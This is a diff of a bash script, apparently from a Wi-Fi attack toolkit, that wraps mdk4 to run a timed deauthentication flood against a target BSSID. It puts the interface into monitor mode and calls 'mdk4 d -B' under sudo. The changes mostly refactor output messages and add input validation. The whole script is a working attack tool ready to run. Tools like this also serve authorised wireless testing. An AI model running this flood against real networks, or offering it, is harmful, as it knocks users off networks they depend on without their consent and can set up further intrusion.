@@ -1,80 +1,120 @@
 #!/bin/bash
-# Developer Utility: Manual Deauth Flood using mdk4
-# Usage: ./run_mdk4_deauth.sh
+# Utility: Manual Deauth Flood using mdk4
+# 
+# Description:
+#   Launches a targeted deauthentication flood using mdk4 against a specified BSSID.
+#
+# Requirements:
+#   - mdk4 must be installed and in PATH
+#   - Must be run with sudo/root privileges
+#   - Interface must support monitor mode (automatically handled)
+#
+# Usage:
+#   ./run_mdk4_deauth.sh
+#
+# Inputs:
+#   - Wireless interface (e.g. wlan0)
+#   - Target BSSID (e.g. AA:BB:CC:DD:EE:FF)
+#   - Attack duration in seconds (optional; defaults to config value)
+#
+# Example:
+#   ./run_mdk4_deauth.sh
+#
+# Notes:
+#   - Automatically enables monitor mode if needed
+#   - Cleans up on SIGINT or timeout using EXIT trap
+#   - Resets MAC address to hardware default before launch
 
-# Load config
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-source "$SCRIPT_DIR/../config.sh"
+# Load helpers
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+source "$SCRIPT_DIR/config.sh"
+source "$SCRIPT_DIR/print.sh"
 
 # Cleanup
 cleanup() {
-    echo ""
+    print_blank
+    print_info "Starting cleanup"
     rm -f /tmp/watt_attack_active
 
-    # Mode check
+    # Check mode
     MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
     if [[ "$MODE" != "managed" ]]; then
-        echo "[+] Reverting to Managed mode."
+        print_action "Reverting to Managed mode"
         bash "$SCRIPT_DIR/set-mode-managed.sh"
-        echo "[✓] Interface set to Managed mode."
+        print_success "Interface set to Managed mode"
     fi
 
     exit 0   
 }
 
-# Exit traps > cleanup
+# Exit traps
 trap cleanup EXIT
 trap cleanup SIGINT
 
 # Validate config vars
 if [[ -z "$INTERFACE" || -z "$BSSID" || -z "$CHANNEL" ]]; then
-    echo "[!] INTERFACE, BSSID, or CHANNEL not defined in config.sh"
+    print_warn "INTERFACE, BSSID, or CHANNEL not defined in config.sh"
+    exit 1
+fi
+
+# Check mdk4
+if ! command -v mdk4 &> /dev/null; then
+    print_fail "mdk4 not found. Please install it first."
     exit 1
 fi
 
 # Display config
-echo "[+] Interface   : $INTERFACE"
-echo "[+] Target BSSID: $BSSID"
-echo "[+] Channel     : $CHANNEL"
-echo "[+] Mode        : T007 - Deauthentication Flood"
-echo ""
+echo "Interface    : $INTERFACE"
+echo "Target BSSID : $BSSID"
+echo "Channel      : $CHANNEL"
+echo "Mode         : T007 - Deauthentication Flood"
+print_blank
 
 # Confirm attack
 read -rp "[?] Proceed with attack? (y/N): " confirm
 if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
-    echo "[!] Cancelled."
+    print_warn "Cancelled"
     exit 0
 fi
 
 # Input duration
-read -rp "[?] Duration (seconds) [default]: ${T007_ATTACK_DURATION}]: " DURATION
-DURATION="${DURATION:-$T007_ATTACK_DURATION}"
+while true; do
+    print_prompt "Duration (seconds) [default]: ${T007_ATTACK_DURATION}]: "
+    read -r DURATION
+
+    DURATION="${DURATION:-$T007_ATTACK_DURATION}"
+    
+    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
+        break
+    else
+        print_fail "Invalid input. Enter a numeric value (seconds)"
+    fi
+done
 
 # Launch attack
 echo "T007" > /tmp/watt_attack_active
-echo ""
-echo "[+] Starting Attack."
+print_blank
+print_info "Starting Attack"
 
-# Monitor mode check
+# Check mode
 MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
 if [[ "$MODE" != "monitor" ]]; then
-    echo "[+] Enabling Monitor mode."
+    print_action "Enabling Monitor mode"
     bash "$SCRIPT_DIR/set-mode-monitor.sh"
-    echo "[✓] Interface set to Monitor mode."
-    echo ""
+    print_success "Interface set to Monitor mode"
 fi
 
-echo "[+] Running mdk4 for $DURATION seconds..."
-echo
-
+# Run attack
+print_blank
+print_info "Running mdk4 for $DURATION seconds"
 sudo timeout "$DURATION" mdk4 "$INTERFACE" d -B "$BSSID" -c "$CHANNEL"
 EXIT_CODE=$?
 
+# Exit check
 if [[ "$EXIT_CODE" -eq 124 ]]; then
-    echo ""
-    echo "[✓] Attack ended."
+    print_success "Attack ended"
 elif [[ "$EXIT_CODE" -ne 0 ]]; then
-    echo "[!] mdk4 exited with code $EXIT_CODE"
+    print_fail "mdk4 exited with code $EXIT_CODE"
 fi
 
 exit 0
